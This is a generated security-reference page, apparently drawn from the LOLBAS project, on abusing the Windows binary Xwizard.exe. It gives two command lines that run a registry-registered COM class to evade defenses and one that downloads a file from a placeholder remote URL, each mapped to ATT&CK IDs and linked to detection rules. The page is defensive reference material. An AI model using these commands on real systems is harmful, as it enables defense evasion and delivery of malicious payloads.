---
title: "Xwizard.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Xwizard.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml"
build_date: "2026-04-27 18:39:01"
category: "OSBinaries"
aliases:
  - "Xwizard.exe"
functions:
  - "Execute"
  - "Download"
attack_technique_ids:
  - "T1218"
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Xwizard.exe

Execute custom class that has been added to the registry or download a file with Xwizard.exe

## Metadata

- Category: OSBinaries
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSBinaries/Xwizard.yml

## Paths

- `C:\Windows\System32\xwizard.exe`
- `C:\Windows\SysWOW64\xwizard.exe`

## Commands

### 1. Execute

Xwizard.exe running a custom class that has been added to the registry.

```cmd
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
```

- Use Case: Run a com object created in registry to evade defensive counter measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 2. Execute

Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.

```cmd
xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
```

- Use Case: Run a com object created in registry to evade defensive counter measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

### 3. Download

Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.

```cmd
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
```

- Use Case: Download file from Internet
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_class_exec_xwizard.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dll_sideload_xwizard.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/execution_com_object_xwizard.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml

## Resources

- {'Link': 'http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/'}
- {'Link': 'https://www.youtube.com/watch?v=LwDHX7DVHWU'}
- {'Link': 'https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5'}
- {'Link': 'https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/'}
- {'Link': 'https://twitter.com/notwhickey/status/1306023056847110144'}

## Acknowledgements

- {'Person': 'Adam', 'Handle': '@Hexacorn'}
- {'Person': 'Nick Tyrer', 'Handle': '@NickTyrer'}
- {'Person': 'harr0ey', 'Handle': '@harr0ey'}
- {'Person': 'Wade Hickey', 'Handle': '@notwhickey'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml)
